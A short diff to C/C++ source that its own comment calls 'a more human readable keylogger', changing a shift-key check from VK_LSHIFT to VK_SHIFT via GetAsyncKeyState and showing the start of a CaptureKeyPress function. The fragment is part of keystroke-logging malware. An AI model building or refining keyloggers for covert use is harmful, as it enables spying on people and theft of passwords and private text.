@@ -7,7 +7,7 @@
 // a more human readable keylogger
 bool clean = true;
 
-bool isShift() { return (((1 << 15 ) & GetAsyncKeyState(VK_LSHIFT)) ? true : false); }
+bool isShift() { return (((1 << 15 ) & GetAsyncKeyState(VK_SHIFT)) ? true : false); }
 
 const char* CaptureKeyPress(const int& key, const bool& clean) {
 	
